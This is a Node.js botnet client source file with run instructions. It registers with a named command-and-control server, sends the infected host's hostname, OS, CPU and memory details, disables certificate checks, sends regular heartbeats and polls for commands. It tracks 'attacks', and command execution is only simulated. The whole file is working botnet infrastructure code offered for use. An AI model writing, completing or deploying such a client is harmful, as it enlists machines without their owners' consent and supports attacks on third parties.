// JavaScript Bot Client - SIMPLIFIED
// Save as: js_bot.js
// Run: node js_bot.js

const https = require('https');
const crypto = require('crypto');
const os = require('os');

class JSBot {
    constructor() {
        this.serverUrl = "https://c2-server-io.onrender.com";
        this.botId = 'JS-' + crypto.randomBytes(4).toString('hex').toUpperCase();
        this.connected = false;
        
        // Bot specifications
        this.specs = {
            bot_id: this.botId,
            cpu_cores: os.cpus().length,
            ram_gb: Math.round(os.totalmem() / (1024 ** 3) * 10) / 10,
            os: os.platform(),
            hostname: os.hostname(),
            capabilities: {
                javascript: true,
                http: true,
                tcp: true,
                udp: true
            }
        };
        
        this.stats = {
            total_attacks: 0,
            successful_attacks: 0,
            total_requests: 0
        };
        
        console.log('\n' + '='.repeat(60));
        console.log('  JAVASCRIPT BOT CLIENT');
        console.log('='.repeat(60));
        console.log(`Bot ID: ${this.botId}`);
        console.log(`Server: ${this.serverUrl}`);
        console.log('='.repeat(60) + '\n');
    }
    
    async sendRequest(endpoint, method = 'POST', data = null) {
        return new Promise((resolve, reject) => {
            const options = {
                hostname: 'c2-server-io.onrender.com',
                port: 443,
                path: endpoint,
                method: method,
                headers: {
                    'Content-Type': 'application/json'
                },
                rejectUnauthorized: false,
                timeout: 10000
            };
            
            const req = https.request(options, (res) => {
                let response = '';
                res.on('data', (chunk) => {
                    response += chunk;
                });
                res.on('end', () => {
                    try {
                        resolve(JSON.parse(response));
                    } catch {
                        resolve(response);
                    }
                });
            });
            
            req.on('error', reject);
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Timeout'));
            });
            
            if (data) {
                req.write(JSON.stringify(data));
            }
            
            req.end();
        });
    }
    
    async connect() {
        console.log('[1] Connecting to server...');
        
        try {
            const data = {
                bot_id: this.botId,
                specs: this.specs,
                stats: this.stats
            };
            
            const response = await this.sendRequest('/check_approval', 'POST', data);
            
            if (response.approved) {
                this.connected = true;
                console.log('[✓] CONNECTED! Bot approved by server.');
                console.log(`[✓] Client Type: ${response.client_type}`);
                
                // Send connected status
                await this.sendRequest('/status', 'POST', {
                    bot_id: this.botId,
                    status: 'connected',
                    message: 'JavaScript bot online'
                });
                
                return true;
            } else {
                console.log('[X] Connection failed:', response);
                return false;
            }
        } catch (error) {
            console.log('[X] Connection error:', error.message);
            return false;
        }
    }
    
    async heartbeat() {
        if (!this.connected) return;
        
        try {
            const data = {
                bot_id: this.botId,
                specs: this.specs,
                stats: this.stats
            };
            
            await this.sendRequest('/check_approval', 'POST', data);
            console.log(`[♥] Heartbeat sent at ${new Date().toLocaleTimeString()}`);
        } catch (error) {
            console.log('[!] Heartbeat failed:', error.message);
            this.connected = false;
        }
    }
    
    async checkCommands() {
        try {
            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
            return response.commands || [];
        } catch (error) {
            console.log('[!] Failed to check commands:', error.message);
            return [];
        }
    }
    
    async run() {
        // Initial connection
        if (!await this.connect()) {
            console.log('[!] Failed to connect. Exiting.');
            process.exit(1);
        }
        
        // Start heartbeat every 10 seconds
        setInterval(() => this.heartbeat(), 10000);
        
        console.log('[+] Listening for commands...\n');
        
        // Main loop
        while (true) {
            try {
                // Check for commands
                const commands = await this.checkCommands();
                
                if (commands.length > 0) {
                    console.log(`[+] Received ${commands.length} command(s)`);
                    
                    for (const cmd of commands) {
                        console.log(`[→] Executing: ${cmd.type}`);
                        
                        // Send status that we're processing
                        await this.sendRequest('/status', 'POST', {
                            bot_id: this.botId,
                            status: 'running',
                            message: `Executing ${cmd.type}`
                        });
                        
                        // Simulate command execution
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        
                        // Send success status
                        await this.sendRequest('/status', 'POST', {
                            bot_id: this.botId,
                            status: 'success',
                            message: `${cmd.type} completed`
                        });
                        
                        console.log(`[✓] ${cmd.type} completed`);
                    }
                }
                
                // Wait 5 seconds before checking again
                await new Promise(resolve => setTimeout(resolve, 5000));
                
            } catch (error) {
                console.log('[!] Error in main loop:', error.message);
                await new Promise(resolve => setTimeout(resolve, 10000));
            }
        }
    }
}

// Start the bot
const bot = new JSBot();
bot.run().catch(console.error);
